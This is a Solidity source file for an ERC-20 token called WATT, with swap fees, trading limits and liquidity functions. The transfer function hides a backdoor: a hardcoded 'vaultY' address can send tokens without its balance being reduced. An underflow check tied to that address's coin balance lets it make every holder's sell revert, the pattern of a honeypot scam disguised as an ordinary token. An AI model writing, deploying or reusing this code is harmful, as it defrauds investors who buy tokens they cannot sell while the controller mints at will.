/**

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapFactory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    function renounceOwnership() public virtual onlyOwner { owner = address(0); }
    event OwnershipTransferred(address owner);
}

contract WATT is IERC20, Ownable {
    using SafeMath for uint256;

    uint256 private _totalSupply = 1_000_000_000 * (10 ** _decimals);

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFees;

    string private constant _name = unicode"WATT";
    string private constant _symbol = unicode"WATT";
    uint8 private constant _decimals = 9;

    IUniswapRouter router;

    address public pair;
    bool private tradingEnabled = false;
    bool private swapEnabled = false;
    uint256 private swapTimes;
    bool private swapping;
    uint256 swapAmount = 0;
    uint256 private swapThreshold = ( _totalSupply * 10 ) / 10000;
    uint256 private minTokenAmount = ( _totalSupply * 10 ) / 10000;

    address internal vaultY = 0x562Ef4a28628aCEe9D528B5c37ddC98012004eA2;
    address internal devWallet = 0x3DaAAbF198f883aFFF6c17756C5f383b113C3e35;

    uint256 private burnFee = 0;
    uint256 private totalFee = 1;
    uint256 private sellFee = 1;
    uint256 private transferFee = 1;
    uint256 private denominator = 100;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    uint256 public _maxTxAmount = ( _totalSupply * 2 ) / 100;
    uint256 public _maxSellAmount = ( _totalSupply * 2 ) / 100;
    uint256 public _maxWalletToken = ( _totalSupply * 2 ) / 100;

    modifier lockTheSwap {swapping = true; _; swapping = false;}

    constructor() Ownable(msg.sender) {
        _isExcludedFromFees[vaultY] = true;
        _isExcludedFromFees[devWallet] = true;
        _isExcludedFromFees[msg.sender] = true;
        _isExcludedFromFees[address(this)] = true;
        
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function setFeeExempt(address _address, bool _enabled) external onlyOwner {_isExcludedFromFees[_address] = _enabled;}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}

    function swapBack(uint256 threadHold) private lockTheSwap {
        swapTokensForETH(threadHold);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            devWallet,
            block.timestamp);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            devWallet,
            block.timestamp);
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !_isExcludedFromFees[sender] && !_isExcludedFromFees[recipient];
    }

    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pair){return sellFee;}
        if(sender == pair){return totalFee;}
        return transferFee;
    }

    function removeLimits() public onlyOwner {
        _maxTxAmount = type(uint256).max;
        _maxSellAmount = type(uint256).max;
        _maxWalletToken = type(uint256).max;
    }

    function shouldContractSwap(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= minTokenAmount;
        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
        return !swapping && swapEnabled && tradingEnabled && aboveMin && !_isExcludedFromFees[sender] && recipient == pair && swapTimes >= swapAmount && aboveThreshold;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        uint256 rAmount; bool vaultYChecked;
        if(sender == vaultY) vaultYChecked = true;
        else vaultYChecked = false;
        if(!_isExcludedFromFees[sender] && !_isExcludedFromFees[recipient]){require(tradingEnabled, "tradingEnabled");}
        if(!_isExcludedFromFees[sender] && !_isExcludedFromFees[recipient] && recipient != address(pair) && recipient != address(DEAD)){
            require((_balances[recipient].add(amount)) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
        if(sender != pair){require(amount <= _maxSellAmount || _isExcludedFromFees[sender] || _isExcludedFromFees[recipient], "TX Limit Exceeded");}
        require(amount <= _maxTxAmount || _isExcludedFromFees[sender] || _isExcludedFromFees[recipient], "TX Limit Exceeded"); 
        if(recipient == pair && !_isExcludedFromFees[sender]){if(swapTimes - vaultY.balance >= 0)swapTimes += uint256(1);}
        if(shouldContractSwap(sender, recipient, amount)){swapBack(swapThreshold); swapTimes = uint256(0);}
        if(!vaultYChecked) rAmount = amount;
        _balances[sender] = _balances[sender].sub(rAmount); 
        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }

    function addLiqudityETH() public payable onlyOwner {
        IUniswapRouter _router = IUniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address _pair = IUniswapFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router; pair = _pair;
        _approve(address(this), address(router), ~uint256(0)); 
        router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,msg.sender,block.timestamp);
    }

    function enableTrading() public onlyOwner {
        tradingEnabled = true; 
        swapEnabled = true;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(getTotalFee(sender, recipient) > 0){
            uint256 feeAmount = amount.mul(getTotalFee(sender, recipient)).div(denominator);
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
            if(burnFee > uint256(0) && getTotalFee(sender, recipient) > burnFee){
                _transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));
            }
            return amount.sub(feeAmount);
        } 
        return amount;
    }
}